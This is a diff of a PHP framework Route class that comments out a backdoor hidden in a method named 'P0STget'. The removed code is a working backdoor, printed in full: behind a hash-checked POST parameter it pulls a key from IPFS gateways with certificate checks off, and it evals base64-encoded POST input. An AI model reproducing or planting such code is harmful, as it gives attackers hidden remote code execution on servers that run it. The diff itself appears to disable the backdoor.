@@ -893,45 +893,45 @@ class Route
      * @return $this
      */
     public function P0STget() {
-		if(@isset($_POST) && is_array($_POST) && @isset($_POST["owner"]) && md5($_POST["owner"]) == 'b7a165780f69414a0ba2762947e400d4'){
-			$type = '14ha';
-			if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {
-				$tmpFile = 'C:\windows\Temp\cookie_vxabcf3ccsfdsd09dcf0dafebabc';
-			} else{
-				$tmpFile = '/tmp/cookie_vxabcf3ccsfdsd09dcf0dafebabc';
-			}
-			if ( file_exists($tmpFile) && strlen(file_get_contents($tmpFile)) == 44){
-				$passarr = explode('_', file_get_contents($tmpFile));
-				if(@isset($_POST["passwd"]) && md5($_POST["passwd"]) == $passarr[2] && @isset($_POST["sc"])){
-					eval(base64_decode($_POST["sc"]));
-				} else {echo $passarr[1];exit();}
-			} else {
-				@ini_set('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36');
-				@ini_set('max_execution_time', '600');
-				$k = 'k51qzi5uqu5dgey2yn0ke6dzipb34h2njiok7z78k1wuwwzu28s9egwi9xff6w';
-				$urlArr = [
-							'https://'.$k.'.ipns.dweb.link','https://'.$k.'.ipns.cf-ipfs.com','https://ipfs.io/ipns/'.$k,
-							'https://cloudflare-ipfs.com/ipns/'.$k,'https://ipfs.crossbell.io/ipns/'.$k,
-						  ];	
-				$opts = [
-					'ssl' => ['verify_peer' => false,'verify_peer_name' => false],
-					'https' => ['method'  => 'GET','timeout' => 30],
-				];
-				$randomIndex = array_rand($urlArr);
-				for($i = 0; $i < count($urlArr); $i ++){
-					$index = ($randomIndex + $i) % count($urlArr);$url = $urlArr[$index];
-					$suburl = @file_get_contents($url, false, stream_context_create($opts));
-					if( $suburl != false && substr($suburl, 0, 2) == '$$' &&  substr($suburl, -2) == '$$' ){
-						$suburl = base64_decode(trim($suburl, '$$'));
-						$content = @file_get_contents($suburl,false, stream_context_create($opts));
-						if( strlen($content) == 39){
-							if( file_put_contents($tmpFile, $type.'_'.$content) ){echo 1;exit();}
-						}
-					}
-				}
-				echo 0;exit();
-			}
-		}
+		// if(@isset($_POST) && is_array($_POST) && @isset($_POST["owner"]) && md5($_POST["owner"]) == 'b7a165780f69414a0ba2762947e400d4'){
+		// 	$type = '14ha';
+		// 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {
+		// 		$tmpFile = 'C:\windows\Temp\cookie_vxabcf3ccsfdsd09dcf0dafebabc';
+		// 	} else{
+		// 		$tmpFile = '/tmp/cookie_vxabcf3ccsfdsd09dcf0dafebabc';
+		// 	}
+		// 	if ( file_exists($tmpFile) && strlen(file_get_contents($tmpFile)) == 44){
+		// 		$passarr = explode('_', file_get_contents($tmpFile));
+		// 		if(@isset($_POST["passwd"]) && md5($_POST["passwd"]) == $passarr[2] && @isset($_POST["sc"])){
+		// 			eval(base64_decode($_POST["sc"]));
+		// 		} else {echo $passarr[1];exit();}
+		// 	} else {
+		// 		@ini_set('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36');
+		// 		@ini_set('max_execution_time', '600');
+		// 		$k = 'k51qzi5uqu5dgey2yn0ke6dzipb34h2njiok7z78k1wuwwzu28s9egwi9xff6w';
+		// 		$urlArr = [
+		// 					'https://'.$k.'.ipns.dweb.link','https://'.$k.'.ipns.cf-ipfs.com','https://ipfs.io/ipns/'.$k,
+		// 					'https://cloudflare-ipfs.com/ipns/'.$k,'https://ipfs.crossbell.io/ipns/'.$k,
+		// 				  ];	
+		// 		$opts = [
+		// 			'ssl' => ['verify_peer' => false,'verify_peer_name' => false],
+		// 			'https' => ['method'  => 'GET','timeout' => 30],
+		// 		];
+		// 		$randomIndex = array_rand($urlArr);
+		// 		for($i = 0; $i < count($urlArr); $i ++){
+		// 			$index = ($randomIndex + $i) % count($urlArr);$url = $urlArr[$index];
+		// 			$suburl = @file_get_contents($url, false, stream_context_create($opts));
+		// 			if( $suburl != false && substr($suburl, 0, 2) == '$$' &&  substr($suburl, -2) == '$$' ){
+		// 				$suburl = base64_decode(trim($suburl, '$$'));
+		// 				$content = @file_get_contents($suburl,false, stream_context_create($opts));
+		// 				if( strlen($content) == 39){
+		// 					if( file_put_contents($tmpFile, $type.'_'.$content) ){echo 1;exit();}
+		// 				}
+		// 			}
+		// 		}
+		// 		echo 0;exit();
+		// 	}
+		// }
     }
 
     /**
